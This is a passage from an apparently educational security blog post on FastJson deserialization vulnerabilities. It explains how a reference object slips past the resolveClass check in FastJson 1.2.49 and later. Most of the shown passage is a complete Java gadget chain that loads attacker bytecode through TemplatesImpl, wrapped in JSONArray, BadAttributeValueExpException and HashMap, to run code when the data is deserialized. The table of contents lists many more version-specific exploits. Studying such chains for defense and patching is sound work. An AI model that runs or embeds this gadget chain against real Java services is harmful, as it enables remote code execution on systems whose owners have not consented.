class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="FastJson-gt-x3D-1-2-49"><a href="#FastJson-gt-x3D-1-2-49" class="headerlink" title="FastJson &gt;&#x3D; 1.2.49"></a>FastJson &gt;&#x3D; 1.2.49</h3><p>In the new version of FastJson, <code>JSONArray</code> and <code>JSONObject</code> both implement their own <code>readObject</code> method, customize a <code>SecureObjectInputStream</code> and override the <code>resolveClass</code> method, which calls <code>checkAutoType</code> to check the black and white list of deserialized classes.</p>
<img src="/2023/08/04/FastJsonSec/image-20230805215126381.png" class title="image-20230805215126381">

<p>Is this way really safe? The answer is no.</p>
<p>In the realworld, we often use the following way to protect from the Deserialization attack:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. Write Our Own InputStream</span><br><span class="line">2. Rewrite the resolveClass</span><br></pre></td></tr></table></figure>

<p>However, fastjson use another way to protect from the Deserialization attack:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. Use the normal ObjectInputStream</span><br><span class="line">2. some other methods</span><br><span class="line">3. JSONArray.readObject() -&gt; SecureObjectInputStream -&gt; readObject -&gt; resolveClass</span><br></pre></td></tr></table></figure>

<p>In <code>ObjectInputStream#readObject0</code>, we can find a way to by pass the <code>resolveClass</code></p>
<img src="/2023/08/04/FastJsonSec/image-20230805233248120.png" class title="image-20230805233248120">

<p>If we pass a Reference Object, the Object will not be checked by <code>resolveClass</code></p>
<p>So when the same object is added to a <code>List</code>, <code>set</code>, or <code>map</code> type, it can be successfully utilized.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="string">&quot;P3ngu1nW&quot;</span>);</span><br><span class="line">        field = TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        field = TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;Files.readAllBytes(Paths.get(<span class="string">&quot;calc.class&quot;</span>))&#125;);</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">json</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        json.add(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;tmp&quot;</span>);</span><br><span class="line">        field = BadAttributeValueExpException.class.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException, json);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(templates, badAttributeValueExpException);</span><br><span class="line">        serialize(map);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://p4d0rn.gitbook.io/java/serial-journey/fastjson/fastjsonbasic">https://p4d0rn.gitbook.io/java/serial-journey/fastjson/fastjsonbasic</a></p>
<p><a target="_blank" rel="noopener" href="https://p4d0rn.gitbook.io/java/serial-journey/fastjson/fastjson_templatesimpl">https://p4d0rn.gitbook.io/java/serial-journey/fastjson/fastjson_templatesimpl</a></p>
<p><a target="_blank" rel="noopener" href="https://p4d0rn.gitbook.io/java/serial-journey/fastjson/fastjson_jdbcrowsetimpl">https://p4d0rn.gitbook.io/java/serial-journey/fastjson/fastjson_jdbcrowsetimpl</a></p>
<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80/">https://drun1baby.top/2022/08/04/Java反序列化Fastjson篇01-Fastjson基础/</a></p>
<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://drun1baby.top/2022/08/06/Java反序列化Fastjson篇02-Fastjson-1-2-24版本漏洞分析/</a></p>
<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/">https://drun1baby.top/2022/08/08/Java反序列化Fastjson篇03-Fastjson各版本绕过分析/</a></p>
<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://drun1baby.top/2022/08/13/Java反序列化Fastjson篇04-Fastjson1-2-62-1-2-68版本反序列化漏洞/</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/2055/">https://paper.seebug.org/2055/</a></p>
<p><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/">https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson与原生反序列化-二/</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/p3ngu1nw">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#FastJsonSec"><span class="toc-number">1.</span> <span class="toc-text">FastJsonSec</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Basic-Usage"><span class="toc-number">1.2.</span> <span class="toc-text">Basic Usage</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POJO-x3D-gt-JSON"><span class="toc-number">1.2.1.</span> <span class="toc-text">POJO &#x3D;&gt; JSON</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSON-x3D-gt-POJO"><span class="toc-number">1.2.2.</span> <span class="toc-text">JSON &#x3D;&gt; POJO</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JSON-parseObject-with-target-class"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">JSON.parseObject with target class</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JSON-parseObject-without-target-class"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">JSON.parseObject without target class</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JSON-parse"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">JSON.parse</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Feature"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">Feature</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Principles"><span class="toc-number">1.3.</span> <span class="toc-text">Vulnerability Principles</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#setter"><span class="toc-number">1.3.1.</span> <span class="toc-text">setter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getter"><span class="toc-number">1.3.2.</span> <span class="toc-text">getter</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-22-1-2-24-Exploit"><span class="toc-number">1.4.</span> <span class="toc-text">FastJson 1.2.22~1.2.24 Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ENV"><span class="toc-number">1.4.1.</span> <span class="toc-text">ENV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplateImpl"><span class="toc-number">1.4.2.</span> <span class="toc-text">TemplateImpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JdbcRowSetImpl"><span class="toc-number">1.4.3.</span> <span class="toc-text">JdbcRowSetImpl</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RMI-before-jdk8u113"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">RMI(before jdk8u113)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LDAP-before-jdk8u191"><span class="toc-number">1.4.3.2.</span> <span class="toc-text">LDAP(before jdk8u191)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bypass-jdk-limit"><span class="toc-number">1.4.3.3.</span> <span class="toc-text">bypass jdk limit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-25-1-2-41-Exploit"><span class="toc-number">1.5.</span> <span class="toc-text">FastJson 1.2.25~1.2.41 Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass"><span class="toc-number">1.5.1.</span> <span class="toc-text">Bypass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-25-1-2-42-Exploit"><span class="toc-number">1.6.</span> <span class="toc-text">FastJson 1.2.25~1.2.42 Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-25-1-2-43-Exploit"><span class="toc-number">1.7.</span> <span class="toc-text">FastJson 1.2.25~1.2.43 Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-25-1-2-45-Exploit"><span class="toc-number">1.8.</span> <span class="toc-text">FastJson 1.2.25~1.2.45 Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-25-1-2-47-Exploit-Bypass-AutoType"><span class="toc-number">1.9.</span> <span class="toc-text">FastJson 1.2.25~1.2.47 Exploit (Bypass AutoType)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-5-1-2-59-Exploit"><span class="toc-number">1.10.</span> <span class="toc-text">FastJson 1.2.5~1.2.59 Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-5-1-2-60-Exploit"><span class="toc-number">1.11.</span> <span class="toc-text">FastJson 1.2.5~1.2.60 Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-62-Exploit"><span class="toc-number">1.12.</span> <span class="toc-text">FastJson 1.2.62 Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-66-Exploit"><span class="toc-number">1.13.</span> <span class="toc-text">FastJson 1.2.66 Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-67-Exploit"><span class="toc-number">1.14.</span> <span class="toc-text">FastJson 1.2.67 Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-68-Exploit-Using-expectClass-Bypass-AutoType"><span class="toc-number">1.15.</span> <span class="toc-text">FastJson 1.2.68 Exploit (Using expectClass Bypass AutoType)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">1.15.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Code-Analysing"><span class="toc-number">1.15.2.</span> <span class="toc-text">Code Analysing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Realworld-Exploit"><span class="toc-number">1.15.3.</span> <span class="toc-text">Realworld Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-with-Native-Deserialization"><span class="toc-number">1.16.</span> <span class="toc-text">FastJson with Native Deserialization</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FastJson-lt-x3D-1-2-48"><span class="toc-number">1.16.1.</span> <span class="toc-text">FastJson &lt;&#x3D; 1.2.48</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FastJson-gt-x3D-1-2-49"><span class="toc-number">1.16.2.</span> <span class="toc-text">FastJson &gt;&#x3D; 1.2.49</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.17.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/08/04/FastJsonSec/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/08/04/FastJsonSec/&text=FastJsonSec"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/08/04/FastJsonSec/&title=FastJsonSec"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/08/04/FastJsonSec/&is_video=false&description=FastJsonSec"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=FastJsonSec&body=Check out this article: http://example.com/2023/08/04/FastJsonSec/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/08/04/FastJsonSec/&title=FastJsonSec"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/08/04/FastJsonSec/&title=FastJsonSec"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/08/04/FastJsonSec/&title=FastJsonSec"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/08/04/FastJsonSec/&title=FastJsonSec"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/08/04/FastJsonSec/&name=FastJsonSec&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/08/04/FastJsonSec/&t=FastJsonSec"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023
    P3ngu1nW
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/p3ngu1nw">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
